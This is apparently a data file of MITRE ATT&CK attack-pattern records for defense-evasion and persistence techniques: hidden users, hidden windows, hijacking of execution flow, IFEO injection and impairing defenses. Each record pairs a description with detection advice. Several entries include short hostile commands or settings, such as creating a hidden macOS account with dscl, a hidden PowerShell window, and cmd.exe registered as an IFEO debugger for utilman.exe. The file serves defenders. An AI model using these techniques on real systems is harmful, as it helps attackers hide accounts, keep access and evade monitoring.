    "{\"created\":\"2020-03-13T20:12:40.876Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use hidden users to mask the presence of user accounts they create. Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account.\\n\\nThere is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. When using the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID under 500 (ex: <code>sudo dscl . -create /Users/username UniqueID 401</code>) and enabling this property (setting it to Yes), an adversary can conceal user accounts. (Citation: Cybereason OSX Pirrit).\",\"external_references\":[{\"external_id\":\"T1564.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1564/002\"},{\"description\":\"Amit Serper. (2016). Cybereason Lab Analysis OSX.Pirrit. Retrieved July 8, 2017.\",\"source_name\":\"Cybereason OSX Pirrit\",\"url\":\"https://www2.cybereason.com/research-osx-pirrit-mac-os-x-secuirty\"}],\"id\":\"attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T22:36:25.994Z\",\"name\":\"Hidden Users\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Authentication logs\"],\"x_mitre_detection\":\"This technique prevents the new user from showing up at the log in screen, but all of the other signs of a new user still exist. The user still gets a home directory and will appear in the authentication logs.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\",\"Administrator\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1143\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1143\"},{\"description\":\"Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019.\",\"source_name\":\"PowerShell About 2019\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1\"},{\"description\":\"Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.\",\"source_name\":\"Antiquated Mac Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\"}],\"id\":\"attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf\",\"modified\":\"2020-03-13T21:03:18.600Z\",\"name\":\"Hidden Window\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-13T20:26:49.433Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \\n\\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\\n\\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application\'s icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don\'t also want to show up in the Dock.\\n\\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)\",\"external_references\":[{\"external_id\":\"T1564.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1564/003\"},{\"description\":\"Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019.\",\"source_name\":\"PowerShell About 2019\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1\"},{\"description\":\"Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.\",\"source_name\":\"Antiquated Mac Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\"}],\"id\":\"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T22:49:43.557Z\",\"name\":\"Hidden Window\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"PowerShell logs\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they\'re relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-26T17:41:25.933Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\\n\\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)\",\"external_references\":[{\"external_id\":\"T1564\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1564\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"},{\"description\":\"Amit Serper. (2016). Cybereason Lab Analysis OSX.Pirrit. Retrieved July 8, 2017.\",\"source_name\":\"Cybereason OSX Pirrit\",\"url\":\"https://www2.cybereason.com/research-osx-pirrit-mac-os-x-secuirty\"},{\"description\":\"Arntz, P. (2015, July 22). Introduction to Alternate Data Streams. Retrieved March 21, 2018.\",\"source_name\":\"MalwareBytes ADS July 2015\",\"url\":\"https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/\"},{\"description\":\"SophosLabs. (2020, May 21). Ragnar Locker ransomware deploys virtual machine to dodge security. Retrieved June 29, 2020.\",\"source_name\":\"Sophos Ragnar May 2020\",\"url\":\"https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\"}],\"id\":\"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-07-06T19:03:40.511Z\",\"name\":\"Hide Artifacts\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"PowerShell logs\",\"Authentication logs\",\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-12T20:38:12.465Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\\n\\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.\",\"external_references\":[{\"external_id\":\"T1574\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574\"},{\"description\":\"Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.\",\"source_name\":\"Autoruns for Windows\",\"url\":\"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\"}],\"id\":\"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-26T16:09:59.324Z\",\"name\":\"Hijack Execution Flow\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Environment variable\",\"Loaded DLLs\",\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\",\"DLL monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\\n\\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\\n\\nMonitor for changes to environment variables, as well as the commands to implement these changes.\\n\\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\\n\\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\\n\\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1179\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1179\"},{\"description\":\"Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.\",\"source_name\":\"Microsoft Hook Overview\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks. Retrieved December 12, 2017.\",\"source_name\":\"Adlice Software IAT Hooks Oct 2014\",\"url\":\"https://www.adlice.com/userland-rootkits-part-1-iat-hooks/\"},{\"description\":\"Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User Mode. Retrieved December 20, 2017.\",\"source_name\":\"MWRInfoSecurity Dynamic Hooking 2015\",\"url\":\"https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/\"},{\"description\":\"Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved December 12, 2017.\",\"source_name\":\"HighTech Bridge Inline Hooking Sept 2011\",\"url\":\"https://www.exploit-db.com/docs/17802.pdf\"},{\"description\":\"Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I. Retrieved December 18, 2017.\",\"source_name\":\"Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017\",\"url\":\"https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918\"},{\"description\":\"Symantec. (n.d.). Windows Rootkit Overview. Retrieved December 21, 2017.\",\"source_name\":\"Symantec Windows Rootkits\",\"url\":\"https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf\"},{\"description\":\"Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.\",\"source_name\":\"Volatility Detecting Hooks Sept 2012\",\"url\":\"https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html\"},{\"description\":\"Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.\",\"source_name\":\"PreKageo Winhook Jul 2011\",\"url\":\"https://github.com/prekageo/winhook\"},{\"description\":\"Satiro, J. (2011, September 14). GetHooks. Retrieved December 12, 2017.\",\"source_name\":\"Jay GetHooks Sept 2011\",\"url\":\"https://github.com/jay/gethooks\"},{\"description\":\"Felici, M. (2006, December 6). Any application-defined hook procedure on my machine?. Retrieved December 12, 2017.\",\"source_name\":\"Zairon Hooking Dec 2006\",\"url\":\"https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/\"},{\"description\":\"Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense against user-land. Retrieved December 12, 2017.\",\"source_name\":\"EyeofRa Detecting Hooking June 2017\",\"url\":\"https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/\"},{\"description\":\"GMER. (n.d.). GMER. Retrieved December 12, 2017.\",\"source_name\":\"GMER Rootkits\",\"url\":\"http://www.gmer.net/\"},{\"description\":\"Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved December 12, 2017.\",\"source_name\":\"Microsoft Process Snapshot\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx\"},{\"description\":\"Stack Exchange - Security. (2012, July 31). What are the methods to find hooked functions and APIs?. Retrieved December 12, 2017.\",\"source_name\":\"StackExchange Hooks Jul 2012\",\"url\":\"https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis\"}],\"id\":\"attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5\",\"modified\":\"2020-02-12T16:57:40.440Z\",\"name\":\"Hooking\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2017-05-31T21:30:50.958Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated and should no longer be used.**\\n\\nA type-1 hypervisor is a software layer that sits between the guest operating systems and system\'s hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.\",\"external_references\":[{\"external_id\":\"T1062\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1062\"},{\"external_id\":\"CAPEC-552\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/552.html\"},{\"description\":\"Wikipedia. (2016, May 23). Hypervisor. Retrieved June 11, 2016.\",\"source_name\":\"Wikipedia Hypervisor\",\"url\":\"https://en.wikipedia.org/wiki/Hypervisor\"},{\"description\":\"Xen. (n.d.). In Wikipedia. Retrieved November 13, 2014.\",\"source_name\":\"Wikipedia Xen\",\"url\":\"http://en.wikipedia.org/wiki/Xen\"},{\"description\":\"Myers, M., and Youndt, S. (2007). An Introduction to Hardware-Assisted Virtual Machine (HVM) Rootkits. Retrieved November 13, 2014.\",\"source_name\":\"Myers 2007\",\"url\":\"http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.90.8832&rep=rep1&type=pdf\"},{\"description\":\"virtualization.info. (Interviewer) & Liguori, A. (Interviewee). (2006, August 11). Debunking Blue Pill myth &#91;Interview transcript&#93;. Retrieved November 13, 2014.\",\"source_name\":\"virtualization.info 2006\",\"url\":\"http://virtualization.info/en/news/2006/08/debunking-blue-pill-myth.html\"}],\"id\":\"attack-pattern--4be89c7c-ace6-4876-9377-c8d54cef3d63\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-30T13:44:04.712Z\",\"name\":\"Hypervisor\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"System calls\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Type-1 hypervisors may be detected by performing timing analysis. Hypervisors emulate certain CPU instructions that would normally be executed by the hardware. If an instruction takes orders of magnitude longer to execute than normal on a system that should not contain a hypervisor, one may be present. (Citation: virtualization.info 2006)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1183\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1183\"},{\"description\":\"Shanbhag, M. (2010, March 24). Image File Execution Options (IFEO). Retrieved December 18, 2017.\",\"source_name\":\"Microsoft Dev Blog IFEO Mar 2010\",\"url\":\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\"},{\"description\":\"Microsoft. (2017, May 23). GFlags Overview. Retrieved December 18, 2017.\",\"source_name\":\"Microsoft GFlags Mar 2017\",\"url\":\"https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview\"},{\"description\":\"Marshall, D. & Griffin, S. (2017, November 28). Monitoring Silent Process Exit. Retrieved June 27, 2018.\",\"source_name\":\"Microsoft Silent Process Exit NOV 2017\",\"url\":\"https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit\"},{\"description\":\"Moe, O. (2018, April 10). Persistence using GlobalFlags in Image File Execution Options - Hidden from Autoruns.exe. Retrieved June 27, 2018.\",\"source_name\":\"Oddvar Moe IFEO APR 2018\",\"url\":\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"FSecure. (n.d.). Backdoor - W32/Hupigon.EMV - Threat Description. Retrieved December 18, 2017.\",\"source_name\":\"FSecure Hupigon\",\"url\":\"https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml\"},{\"description\":\"Symantec. (2008, June 28). Trojan.Ushedix. Retrieved December 18, 2017.\",\"source_name\":\"Symantec Ushedix June 2008\",\"url\":\"https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2\"}],\"id\":\"attack-pattern--62166220-e498-410f-a90a-19d4339d4e99\",\"modified\":\"2020-01-24T15:06:35.811Z\",\"name\":\"Image File Execution Options Injection\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T15:05:58.384Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IEFO) debuggers. IEFOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\\\dbg\\\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\\n\\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\\\SOFTWARE{\\\\Wow6432Node}\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\\n\\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\\n\\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \\\"cmd.exe,\\\" or another program that provides backdoor access, as a \\\"debugger\\\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \\\"debugger\\\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\\n\\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\\n\\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)\",\"external_references\":[{\"external_id\":\"T1546.012\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/012\"},{\"description\":\"Shanbhag, M. (2010, March 24). Image File Execution Options (IFEO). Retrieved December 18, 2017.\",\"source_name\":\"Microsoft Dev Blog IFEO Mar 2010\",\"url\":\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\"},{\"description\":\"Microsoft. (2017, May 23). GFlags Overview. Retrieved December 18, 2017.\",\"source_name\":\"Microsoft GFlags Mar 2017\",\"url\":\"https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview\"},{\"description\":\"Marshall, D. & Griffin, S. (2017, November 28). Monitoring Silent Process Exit. Retrieved June 27, 2018.\",\"source_name\":\"Microsoft Silent Process Exit NOV 2017\",\"url\":\"https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit\"},{\"description\":\"Moe, O. (2018, April 10). Persistence using GlobalFlags in Image File Execution Options - Hidden from Autoruns.exe. Retrieved June 27, 2018.\",\"source_name\":\"Oddvar Moe IFEO APR 2018\",\"url\":\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\"},{\"description\":\"Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.\",\"source_name\":\"Tilbury 2014\",\"url\":\"http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"FSecure. (n.d.). Backdoor - W32/Hupigon.EMV - Threat Description. Retrieved December 18, 2017.\",\"source_name\":\"FSecure Hupigon\",\"url\":\"https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml\"},{\"description\":\"Symantec. (2008, June 28). Trojan.Ushedix. Retrieved December 18, 2017.\",\"source_name\":\"Symantec Ushedix June 2008\",\"url\":\"https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2\"}],\"id\":\"attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T19:39:50.839Z\",\"name\":\"Image File Execution Options Injection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Oddvar Moe, @oddvarmoe\"],\"x_mitre_data_sources\":[\"API monitoring\",\"Windows event logs\",\"Windows Registry\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for abnormal usage of the Glfags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)\\n\\nMonitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Endgame Process Injection July 2017)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T20:22:13.470Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\\n\\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.\",\"external_references\":[{\"external_id\":\"T1562\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1562\"}],\"id\":\"attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-07-07T13:49:05.561Z\",\"name\":\"Impair Defenses\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"GCP audit logs\",\"Azure activity logs\",\"AWS CloudTrail logs\",\"Anti-virus\",\"Services\",\"API monitoring\",\"Environment variable\",\"Authentication logs\",\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\",\"Windows Registry\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Signature-based detection\",\"Host intrusion prevention systems\",\"File monitoring\",\"Digital Certificate Validation\",\"Host forensic analysis\",\"Log analysis\",\"Firewall\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments to see if security tools or logging services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools.  Lack of log events may be suspicious.\\n\\nMonitor environment variables and APIs that can be leveraged to disable security measures.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
